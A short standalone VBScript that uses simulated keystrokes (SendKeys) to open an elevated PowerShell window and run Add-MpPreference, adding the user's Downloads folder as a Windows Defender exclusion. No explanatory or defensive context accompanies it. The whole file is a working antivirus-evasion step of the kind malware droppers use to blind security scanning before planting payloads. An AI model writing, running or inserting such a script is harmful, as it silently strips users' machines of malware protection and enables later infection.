Set x = CreateObject("WScript.Shell")

' Open Start menu
x.SendKeys "^{ESC}"
WScript.Sleep 1000

' Type "powershell"
x.SendKeys "powershell"
WScript.Sleep 1000

' Run as administrator: Ctrl + Shift + Enter
x.SendKeys "^+{ENTER}"
WScript.Sleep 4000  ' Allow time for PowerShell and UAC (if disabled)

' PowerShell command to add exclusion
cmd = "Add-MpPreference -ExclusionPath `"$env:USERPROFILE\Downloads`""

' Send the command
x.SendKeys "powershell -command " & Chr(34) & cmd & Chr(34)
WScript.Sleep 500

' Execute the command
x.SendKeys "{ENTER}"
